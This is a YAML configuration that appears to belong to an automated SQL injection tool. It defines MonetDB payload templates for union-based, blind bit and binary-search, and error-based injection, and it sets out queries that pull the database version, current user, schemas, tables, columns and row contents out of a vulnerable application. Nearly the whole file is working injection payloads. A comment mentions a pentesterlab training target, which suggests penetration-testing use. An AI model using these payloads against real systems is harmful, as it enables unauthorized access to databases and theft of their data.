engine: MonetDB

resource:
 info: |
    select (select value from env() where name='monet_version')
    || '${enclose_value_sql}'
    || (select value from var_values where var_name='current_schema')
    || '${enclose_value_sql}'
    || (select value from var_values where var_name='current_user')
    || '${trail_sql}'

 schema:
  database: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || q
           || '${enclose_value_sql}'
           || '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select
           name r,
           '0' q
       from schemas
       group by r
       ${limit}
   ) x

  table: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}0${enclose_value_sql}'
           || '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select t.name r
       from tables t
       inner join schemas s on t.schema_id = s.id
       where s.name = '${database}'
       order by r
       ${limit}
   ) x

  column: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || n
           || '${separator_qte_sql}'
           || 0
           || '${enclose_value_sql}'
           || '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select c.name n
       from tables t
       inner join schemas s on t.schema_id = s.id  
       inner join columns c on t.id = c.table_id
       where s.name = '${database}'
       and t.name = '${table}'
       order by n
       ${limit}
   ) x

  row:
   query: |
    select concat(
        group_concat(
            '${enclose_value_sql}'
            || r
            || '${separator_qte_sql}'
            || q
            || '${enclose_value_sql}'
            || '${separator_cell_sql}'
        ),
        '${trail_sql}'
    ) from (
        select
            ${fields} r,
            count(*) q
        from ${database}.${table}
        group by r
        ${limit}
    ) x
   fields:
    field: ${field.value}
    concat: "||'%7f'||"

strategy:
 configuration:
  slidingWindow: |
   (
       select
           concat(
               '${lead}',
               substr(
                   (${injection}),
                   ${window.char},
                   ${capacity}
               )
           )
   )
  limit: limit 65536 offset ${limit.value}
  failsafe: 1337${indice}7330%2b1
  calibrator: repeat('${calibrator_sql}', 65536)
  limitBoundary: 0
  # pentesterlab does not work with --+-, switch to #
  endingComment: '%23'
  fingerprint:
   errorMessage:
    - monetdb
   orderByErrorMessage:
    - relational query without result

 union:
  indices: union select ${indices}
  capacity: |
   (
       select 
           '${lead}'
           || ${indice}
           || ${calibrator}
   )
  orderBy: order by 1337

 binary:
  test:
   bit: |
    0 %3c%3e bit_and(
        ascii(
            substring(
                ${injection},
                ${window.char},
                1
            )
        ),
        ${bit}
    )
   bin: |
    code(ascii(
        substring(
            ${injection},
            ${window.char},
            1
        )
    ))
    %3E%3Dcode(${mid.int})
   truthyBin:
    - code(97)%3E%3Dcode(97)
    - code(97)%3E%3Dcode(65)
    - code(97)%3E%3Dcode(48)
    - code(98)%3E%3Dcode(97)
    - code(98)%3E%3Dcode(66)
    - code(49)%3E%3Dcode(48)
   falsyBin:
    - code(97)%3E%3Dcode(98)
    - code(65)%3E%3Dcode(97)
    - code(66)%3E%3Dcode(98)
    - code(66)%3E%3Dcode(97)
    - code(48)%3E%3Dcode(65)
    - code(48)%3E%3Dcode(49)
   truthyBit:
    - "'a' = 'a'"
    - "'b' = 'b'"
    - "'a' %3c%3e 'b'"
    - "1 = 1"
    - "2 = 2"
    - "1 %3c%3e 2"
   falsyBit:
    - "'a' = 'b'"
    - "'a' %3c%3e 'a'"
    - "'b' %3c%3e 'b'"
    - "1 = 2"
    - "1 %3c%3e 1"
    - "2 %3c%3e 2"
  modeAnd: and
  modeOr: or
  modeStack: ; select 1 where
  blind: ${binary.mode} ${test}

 error:
  method:

   - name: bte:or
     query: |
      /* conversion of string '<sqli>' to type bte failed */
      or 1=1+(${window})
     capacity: 255

   - name: bte:and
     query: |
      and 1=1+(${window})
     capacity: 255

   - name: bte:none
     query: |
      1+(${window})
     capacity: 255